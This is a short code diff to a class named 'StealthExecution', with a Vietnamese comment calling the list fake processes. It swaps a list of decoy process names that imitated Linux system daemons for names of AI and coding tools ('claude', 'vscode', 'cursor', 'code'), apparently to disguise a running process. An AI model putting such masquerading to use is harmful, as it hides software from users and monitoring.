@@ -154,16 +154,10 @@ class StealthExecution:
         
         # Các tiến trình giả mạo thông thường
         self._decoy_processes = [
-            "systemd-journal",
-            "systemd-udevd",
-            "kworker/0:1",
-            "kworker/u16:0",
-            "rcu_sched",
-            "irqbalance",
-            "dbus-daemon",
-            "cron",
-            "sshd",
-            "rsyslogd"
+            "claude",
+            "vscode",
+            "cursor",
+            "code"
         ]
         
     def _validate_cpu_only_usage(self) -> None:
